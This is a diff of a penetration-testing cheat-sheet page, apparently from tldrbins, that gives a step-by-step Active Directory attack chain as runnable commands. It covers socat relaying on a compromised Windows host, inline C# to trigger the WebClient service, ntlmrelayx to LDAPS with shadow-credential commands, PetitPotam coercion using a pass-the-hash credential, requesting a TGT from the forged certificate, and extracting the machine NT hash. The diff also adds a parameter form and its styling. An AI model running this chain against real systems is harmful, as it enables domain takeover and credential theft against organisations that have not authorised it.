@@ -205,128 +205,252 @@
   <li><a href="https://tldrbins.github.io/@tgt/">Tgt</a></li>
   
 </ul>
+<hr>
+<div class="content">
+<div id="params">
+	<form id="params_form" style="display: none;">
+	</form>
+	<div class="center">
+		<button id="form_btn">Show Params Form</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
 
-<div class="content"><hr>
+<style>
+#params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: white;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #aaa;
+	font-family: system-ui;
+}
+
+#params * {
+    box-sizing: border-box;
+}
+
+#params input {
+  margin-bottom: 15px;
+}
+
+#params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #f5f5f5;
+}
+
+#params label {
+	color: #333333;
+	font-size: 0.9rem;
+}
+
+#params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #f5f5f5;
+	font-weight: 700;
+	background: rgba(44, 82, 179);
+}
+
+#params button:hover {
+    cursor: pointer;
+    background: rgba(44, 82, 179, 0.95);
+}
+
+.center {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+ 
+body.dark-mode #params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: #23272a;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #23272a;
+	font-family: system-ui;
+}
+
+body.dark-mode #params * {
+    box-sizing: border-box;
+}
+
+body.dark-mode #params input {
+	border-radius: 0.2em;
+	border: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input:focus {
+	margin-bottom: 15px;
+	outline: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #bdbdbd;
+}
+
+body.dark-mode #params label {
+	color: #fafafa;
+	font-size: 0.9rem;
+}
+
+body.dark-mode #params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #fafafa;
+	font-weight: 700;
+	background: #616161;
+}
+
+body.dark-mode #params button:hover {
+    cursor: pointer;
+    background: #424242;
+}
+
+
+</style>
 <h3 id="1-run-socat-to-redirect-traffic-in-windows-target">1. Run socat to redirect traffic (In Windows Target)</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Upload socat.zip and unzip</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="py">IO</span><span class="p">.</span><span class="py">Compression</span><span class="p">.</span><span class="n">FileSystem</span><span class="p">;</span> <span class="p">[</span><span class="no">System.IO.Compression.ZipFile</span><span class="p">]::</span><span class="n">ExtractToDirectory</span><span class="p">(</span><span class="s1">&#39;c:\programdata\socat.zip&#39;</span><span class="p">,</span> <span class="s1">&#39;c:\programdata&#39;</span><span class="p">)</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">socat</span><span class="p">.</span><span class="py">exe</span> <span class="nb">tcp-listen</span><span class="err">:</span><span class="mf">8090</span><span class="p">,</span><span class="n">reuseaddr</span><span class="p">,</span><span class="n">fork</span> <span class="n">tcp</span><span class="err">:</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">10</span><span class="err">:</span><span class="mf">80</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Upload socat.zip and unzip
+</span></span><span class="line"><span class="cl"><span class="go">Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory(&#39;c:\programdata\socat.zip&#39;, &#39;c:\programdata&#39;)
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\socat.exe tcp-listen:8090,reuseaddr,fork tcp:&lt;LOCAL_IP&gt;:80
+</span></span></span></code></pre></div></div>
 <p><small><em>Ref: <a href="https://codeload.github.com/StudioEtrange/socat-windows/zip/refs/heads/master">socat</a></em></small></p>
 <h3 id="2-enable-webdav-in-windows-target">2. Enable webdav (In Windows Target)</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$Source</span> <span class="p">=</span> <span class="sh">@&#34;
-</span></span></span><span class="line"><span class="cl"><span class="sh">using System;
-</span></span></span><span class="line"><span class="cl"><span class="sh">using System.Text;
-</span></span></span><span class="line"><span class="cl"><span class="sh">using System.Security;
-</span></span></span><span class="line"><span class="cl"><span class="sh">using System.Collections.Generic;
-</span></span></span><span class="line"><span class="cl"><span class="sh">using System.Runtime.Versioning;
-</span></span></span><span class="line"><span class="cl"><span class="sh">using Microsoft.Win32.SafeHandles;
-</span></span></span><span class="line"><span class="cl"><span class="sh">using System.Runtime.InteropServices;
-</span></span></span><span class="line"><span class="cl"><span class="sh">using System.Diagnostics.CodeAnalysis;
-</span></span></span><span class="line"><span class="cl"><span class="sh">
-</span></span></span><span class="line"><span class="cl"><span class="sh">namespace JosL.WebClient{
-</span></span></span><span class="line"><span class="cl"><span class="sh">	public static class Starter{
-</span></span></span><span class="line"><span class="cl"><span class="sh">		[StructLayout(LayoutKind.Explicit, Size=16)]
-</span></span></span><span class="line"><span class="cl"><span class="sh">		public class EVENT_DESCRIPTOR{
-</span></span></span><span class="line"><span class="cl"><span class="sh">			[FieldOffset(0)]ushort Id = 1;
-</span></span></span><span class="line"><span class="cl"><span class="sh">			[FieldOffset(2)]byte Version = 0;
-</span></span></span><span class="line"><span class="cl"><span class="sh">			[FieldOffset(3)]byte Channel = 0;
-</span></span></span><span class="line"><span class="cl"><span class="sh">			[FieldOffset(4)]byte Level = 4;
-</span></span></span><span class="line"><span class="cl"><span class="sh">			[FieldOffset(5)]byte Opcode = 0;
-</span></span></span><span class="line"><span class="cl"><span class="sh">			[FieldOffset(6)]ushort Task = 0;
-</span></span></span><span class="line"><span class="cl"><span class="sh">			[FieldOffset(8)]long Keyword = 0;
-</span></span></span><span class="line"><span class="cl"><span class="sh">		}
-</span></span></span><span class="line"><span class="cl"><span class="sh"> 
-</span></span></span><span class="line"><span class="cl"><span class="sh">		[StructLayout(LayoutKind.Explicit, Size = 16)]
-</span></span></span><span class="line"><span class="cl"><span class="sh">		public struct EventData{
-</span></span></span><span class="line"><span class="cl"><span class="sh">			[FieldOffset(0)]
-</span></span></span><span class="line"><span class="cl"><span class="sh">			internal UInt64 DataPointer;
-</span></span></span><span class="line"><span class="cl"><span class="sh">			[FieldOffset(8)]
-</span></span></span><span class="line"><span class="cl"><span class="sh">			internal uint Size;
-</span></span></span><span class="line"><span class="cl"><span class="sh">			[FieldOffset(12)]
-</span></span></span><span class="line"><span class="cl"><span class="sh">			internal int Reserved;
-</span></span></span><span class="line"><span class="cl"><span class="sh">		}
-</span></span></span><span class="line"><span class="cl"><span class="sh"> 
-</span></span></span><span class="line"><span class="cl"><span class="sh">		public static void startService(){
-</span></span></span><span class="line"><span class="cl"><span class="sh">			Guid webClientTrigger = new Guid(0x22B6D684, 0xFA63, 0x4578, 0x87, 0xC9, 0xEF, 0xFC, 0xBE, 0x66, 0x43, 0xC7);
-</span></span></span><span class="line"><span class="cl"><span class="sh"> 
-</span></span></span><span class="line"><span class="cl"><span class="sh">			long handle = 0;
-</span></span></span><span class="line"><span class="cl"><span class="sh">			uint output = EventRegister(ref webClientTrigger, IntPtr.Zero, IntPtr.Zero, ref handle);
-</span></span></span><span class="line"><span class="cl"><span class="sh"> 
-</span></span></span><span class="line"><span class="cl"><span class="sh">			bool success = false;
-</span></span></span><span class="line"><span class="cl"><span class="sh"> 
-</span></span></span><span class="line"><span class="cl"><span class="sh">			if (output == 0){
-</span></span></span><span class="line"><span class="cl"><span class="sh">				EVENT_DESCRIPTOR desc = new EVENT_DESCRIPTOR();
-</span></span></span><span class="line"><span class="cl"><span class="sh">				unsafe
-</span></span></span><span class="line"><span class="cl"><span class="sh">				{
-</span></span></span><span class="line"><span class="cl"><span class="sh">					uint writeOutput = EventWrite(handle, ref desc, 0, null);
-</span></span></span><span class="line"><span class="cl"><span class="sh">					success = writeOutput == 0;
-</span></span></span><span class="line"><span class="cl"><span class="sh">					EventUnregister(handle);
-</span></span></span><span class="line"><span class="cl"><span class="sh">				}
-</span></span></span><span class="line"><span class="cl"><span class="sh">			}
-</span></span></span><span class="line"><span class="cl"><span class="sh">		}
-</span></span></span><span class="line"><span class="cl"><span class="sh"> 
-</span></span></span><span class="line"><span class="cl"><span class="sh">		[DllImport(&#34;Advapi32.dll&#34;, SetLastError = true)]
-</span></span></span><span class="line"><span class="cl"><span class="sh">		public static extern uint EventRegister(ref Guid guid, [Optional] IntPtr EnableCallback, [Optional] IntPtr CallbackContext, [In][Out] ref long RegHandle);
-</span></span></span><span class="line"><span class="cl"><span class="sh"> 
-</span></span></span><span class="line"><span class="cl"><span class="sh">		[DllImport(&#34;Advapi32.dll&#34;, SetLastError = true)]
-</span></span></span><span class="line"><span class="cl"><span class="sh">		public static extern unsafe uint EventWrite(long RegHandle, ref EVENT_DESCRIPTOR EventDescriptor, uint UserDataCount, EventData* UserData);
-</span></span></span><span class="line"><span class="cl"><span class="sh"> 
-</span></span></span><span class="line"><span class="cl"><span class="sh">		[DllImport(&#34;Advapi32.dll&#34;, SetLastError = true)]
-</span></span></span><span class="line"><span class="cl"><span class="sh">		public static extern uint EventUnregister(long RegHandle);
-</span></span></span><span class="line"><span class="cl"><span class="sh">	}
-</span></span></span><span class="line"><span class="cl"><span class="sh">}
-</span></span></span><span class="line"><span class="cl"><span class="sh">&#34;@</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">$compilerParameters</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">CodeDom</span><span class="p">.</span><span class="py">Compiler</span><span class="p">.</span><span class="py">CompilerParameters</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$compilerParameters</span><span class="p">.</span><span class="n">CompilerOptions</span><span class="p">=</span><span class="s2">&#34;/unsafe&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Add-Type</span> <span class="n">-TypeDefinition</span> <span class="nv">$Source</span> <span class="n">-Language</span> <span class="n">CSharp</span> <span class="n">-CompilerParameters</span> <span class="nv">$compilerParameters</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">JosL.WebClient.Starter</span><span class="p">]::</span><span class="n">startService</span><span class="p">()</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">Source</span> <span class="o">=</span> @<span class="s2">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2"></span><span class="go">using System;
+</span></span></span><span class="line"><span class="cl"><span class="go">using System.Text;
+</span></span></span><span class="line"><span class="cl"><span class="go">using System.Security;
+</span></span></span><span class="line"><span class="cl"><span class="go">using System.Collections.Generic;
+</span></span></span><span class="line"><span class="cl"><span class="go">using System.Runtime.Versioning;
+</span></span></span><span class="line"><span class="cl"><span class="go">using Microsoft.Win32.SafeHandles;
+</span></span></span><span class="line"><span class="cl"><span class="go">using System.Runtime.InteropServices;
+</span></span></span><span class="line"><span class="cl"><span class="go">using System.Diagnostics.CodeAnalysis;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">namespace JosL.WebClient{
+</span></span></span><span class="line"><span class="cl"><span class="go">	public static class Starter{
+</span></span></span><span class="line"><span class="cl"><span class="go">		[StructLayout(LayoutKind.Explicit, Size=16)]
+</span></span></span><span class="line"><span class="cl"><span class="go">		public class EVENT_DESCRIPTOR{
+</span></span></span><span class="line"><span class="cl"><span class="go">			[FieldOffset(0)]ushort Id = 1;
+</span></span></span><span class="line"><span class="cl"><span class="go">			[FieldOffset(2)]byte Version = 0;
+</span></span></span><span class="line"><span class="cl"><span class="go">			[FieldOffset(3)]byte Channel = 0;
+</span></span></span><span class="line"><span class="cl"><span class="go">			[FieldOffset(4)]byte Level = 4;
+</span></span></span><span class="line"><span class="cl"><span class="go">			[FieldOffset(5)]byte Opcode = 0;
+</span></span></span><span class="line"><span class="cl"><span class="go">			[FieldOffset(6)]ushort Task = 0;
+</span></span></span><span class="line"><span class="cl"><span class="go">			[FieldOffset(8)]long Keyword = 0;
+</span></span></span><span class="line"><span class="cl"><span class="go">		}
+</span></span></span><span class="line"><span class="cl"><span class="go"> 
+</span></span></span><span class="line"><span class="cl"><span class="go">		[StructLayout(LayoutKind.Explicit, Size = 16)]
+</span></span></span><span class="line"><span class="cl"><span class="go">		public struct EventData{
+</span></span></span><span class="line"><span class="cl"><span class="go">			[FieldOffset(0)]
+</span></span></span><span class="line"><span class="cl"><span class="go">			internal UInt64 DataPointer;
+</span></span></span><span class="line"><span class="cl"><span class="go">			[FieldOffset(8)]
+</span></span></span><span class="line"><span class="cl"><span class="go">			internal uint Size;
+</span></span></span><span class="line"><span class="cl"><span class="go">			[FieldOffset(12)]
+</span></span></span><span class="line"><span class="cl"><span class="go">			internal int Reserved;
+</span></span></span><span class="line"><span class="cl"><span class="go">		}
+</span></span></span><span class="line"><span class="cl"><span class="go"> 
+</span></span></span><span class="line"><span class="cl"><span class="go">		public static void startService(){
+</span></span></span><span class="line"><span class="cl"><span class="go">			Guid webClientTrigger = new Guid(0x22B6D684, 0xFA63, 0x4578, 0x87, 0xC9, 0xEF, 0xFC, 0xBE, 0x66, 0x43, 0xC7);
+</span></span></span><span class="line"><span class="cl"><span class="go"> 
+</span></span></span><span class="line"><span class="cl"><span class="go">			long handle = 0;
+</span></span></span><span class="line"><span class="cl"><span class="go">			uint output = EventRegister(ref webClientTrigger, IntPtr.Zero, IntPtr.Zero, ref handle);
+</span></span></span><span class="line"><span class="cl"><span class="go"> 
+</span></span></span><span class="line"><span class="cl"><span class="go">			bool success = false;
+</span></span></span><span class="line"><span class="cl"><span class="go"> 
+</span></span></span><span class="line"><span class="cl"><span class="go">			if (output == 0){
+</span></span></span><span class="line"><span class="cl"><span class="go">				EVENT_DESCRIPTOR desc = new EVENT_DESCRIPTOR();
+</span></span></span><span class="line"><span class="cl"><span class="go">				unsafe
+</span></span></span><span class="line"><span class="cl"><span class="go">				{
+</span></span></span><span class="line"><span class="cl"><span class="go">					uint writeOutput = EventWrite(handle, ref desc, 0, null);
+</span></span></span><span class="line"><span class="cl"><span class="go">					success = writeOutput == 0;
+</span></span></span><span class="line"><span class="cl"><span class="go">					EventUnregister(handle);
+</span></span></span><span class="line"><span class="cl"><span class="go">				}
+</span></span></span><span class="line"><span class="cl"><span class="go">			}
+</span></span></span><span class="line"><span class="cl"><span class="go">		}
+</span></span></span><span class="line"><span class="cl"><span class="go"> 
+</span></span></span><span class="line"><span class="cl"><span class="go">		[DllImport(&#34;Advapi32.dll&#34;, SetLastError = true)]
+</span></span></span><span class="line"><span class="cl"><span class="go">		public static extern uint EventRegister(ref Guid guid, [Optional] IntPtr EnableCallback, [Optional] IntPtr CallbackContext, [In][Out] ref long RegHandle);
+</span></span></span><span class="line"><span class="cl"><span class="go"> 
+</span></span></span><span class="line"><span class="cl"><span class="go">		[DllImport(&#34;Advapi32.dll&#34;, SetLastError = true)]
+</span></span></span><span class="line"><span class="cl"><span class="go">		public static extern unsafe uint EventWrite(long RegHandle, ref EVENT_DESCRIPTOR EventDescriptor, uint UserDataCount, EventData* UserData);
+</span></span></span><span class="line"><span class="cl"><span class="go"> 
+</span></span></span><span class="line"><span class="cl"><span class="go">		[DllImport(&#34;Advapi32.dll&#34;, SetLastError = true)]
+</span></span></span><span class="line"><span class="cl"><span class="go">		public static extern uint EventUnregister(long RegHandle);
+</span></span></span><span class="line"><span class="cl"><span class="go">	}
+</span></span></span><span class="line"><span class="cl"><span class="go">}
+</span></span></span><span class="line"><span class="cl"><span class="go">&#34;@
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span><span class="nv">compilerParameters</span> <span class="o">=</span> New-Object System.CodeDom.Compiler.CompilerParameters
+</span></span><span class="line"><span class="cl"><span class="gp">$</span>compilerParameters.CompilerOptions<span class="o">=</span><span class="s2">&#34;/unsafe&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="go">Add-Type -TypeDefinition $Source -Language CSharp -CompilerParameters $compilerParameters
+</span></span></span><span class="line"><span class="cl"><span class="go">[JosL.WebClient.Starter]::startService()
+</span></span></span></code></pre></div></div>
 <br>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Run enable_webdav.ps1</span>
-</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">programdata</span><span class="p">\</span><span class="n">enable_webdav</span><span class="p">.</span><span class="py">ps1</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run enable_webdav.ps1
+</span></span><span class="line"><span class="cl"><span class="go">C:\programdata\enable_webdav.ps1
+</span></span></span></code></pre></div></div>
 <h3 id="3-start-ntlmrelayx-listener-in-local-linux">3. Start ntlmrelayx listener (In Local Linux)</h3>
 <h4 id="get-impacket-fork--add-shadow-credentials-commands-to-ntlmrelayxs-interactive-ldap-shell">Get impacket fork : Add Shadow Credentials Commands to Ntlmrelayx&rsquo;s Interactive LDAP Shell</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone -b interactive-ldap-shadow-creds https://github.com/Tw1sm/impacket.git
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> impacket
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git checkout -b remotes/origin/interactive-ldap-shadow-creds
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -m venv <span class="nb">test</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">source</span> test/bin/activate
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pip install .
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pip3 install impacket <span class="nv">pyOpenSSL</span><span class="o">==</span>24.0.0
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">git clone -b interactive-ldap-shadow-creds https://github.com/Tw1sm/impacket.git
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cd impacket
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">git checkout -b remotes/origin/interactive-ldap-shadow-creds
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 -m venv test
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">source test/bin/activate
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pip install .
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pip3 install impacket pyOpenSSL==24.0.0
+</span></span></span></code></pre></div></div>
 <h4 id="run-ntlmrelayx">Run ntlmrelayx</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 examples/ntlmrelayx.py -t ldaps://&lt;DC&gt; --delegate-access -i
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">proxychains4 examples/ntlmrelayx.py -t ldaps://&lt;DC&gt; --delegate-access -i
+</span></span></span></code></pre></div></div>
 <h3 id="4-run-petitpotam-in-local-linux">4. Run PetitPotam (In Local Linux)</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 python3 PetitPotam.py -u &lt;USERNAME&gt; -hashes :&lt;HASH&gt; &lt;SOCAT_HOSTNAME&gt;@8090/test &lt;SOCAT_LISTENER_IP&gt; -pipe all
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">proxychains4 python3 PetitPotam.py -u &lt;USER&gt; -hashes :&lt;HASH&gt; &lt;SOCAT_HOSTNAME&gt;@8090/test &lt;SOCAT_LISTENER_IP&gt; -pipe all
+</span></span></span></code></pre></div></div>
 <p><small><em>Ref: <a href="https://github.com/topotam/PetitPotam">PetitPotam</a></em></small></p>
 <h3 id="5-connect-to-ldap-shell-in-local-linux">5. Connect to LDAP shell (In Local Linux)</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rlwrap nc 127.0.0.1 <span class="m">11000</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">clear_shadow_creds &lt;SOCAT_HOSTNAME&gt;$
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Take Note: pfx path and password</span>
-</span></span><span class="line"><span class="cl">set_shadow_creds &lt;SOCAT_HOSTNAME&gt;$
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">rlwrap nc 127.0.0.1 11000
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">clear_shadow_creds &lt;SOCAT_HOSTNAME&gt;$
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Take Note: pfx path and password
+</span></span><span class="line"><span class="cl"><span class="go">set_shadow_creds &lt;SOCAT_HOSTNAME&gt;$
+</span></span></span></code></pre></div></div>
 <h3 id="6-request-tgt-using-pfx-file-in-local-linux">6. Request TGT using pfx file (In Local Linux)</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 python3 gettgtpkinit.py &lt;DOMAIN&gt;/&lt;SOCAT_HOSTNAME&gt;$ &lt;SOCAT_HOSTNAME&gt;.ccache -cert-pfx &lt;RANDOM_CHARS&gt;.pfx -pfx-pass &lt;RANDOM_CHARS_PASSWORD&gt; -dc-ip &lt;DC&gt;
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">proxychains4 python3 gettgtpkinit.py &#39;&lt;DOMAIN&gt;/&lt;SOCAT_HOSTNAME&gt;$&#39; &lt;SOCAT_HOSTNAME&gt;.ccache -cert-pfx &lt;RANDOM_CHARS&gt;.pfx -pfx-pass &lt;RANDOM_CHARS_PASSWORD&gt; -dc-ip &lt;DC&gt;
+</span></span></span></code></pre></div></div>
 <p><small><em>Ref: <a href="https://github.com/dirkjanm/PKINITtools">PKINITtools</a></em></small></p>
 <h3 id="7-get-nt-hash-in-local-linux">7. Get NT Hash (In Local Linux)</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 python3 getnthash.py &lt;DOMAIN&gt;/&lt;SOCAT_HOSTNAME&gt;$ -key &lt;AS-REP_encryption_key&gt;
-</span></span></code></pre></div></div>
-<br></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">proxychains4 python3 getnthash.py &#39;&lt;DOMAIN&gt;/&lt;SOCAT_HOSTNAME&gt;$&#39; -key &lt;AS_REP_ENC_KEY&gt;
+</span></span></span></code></pre></div></div>
+<br>
+</div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
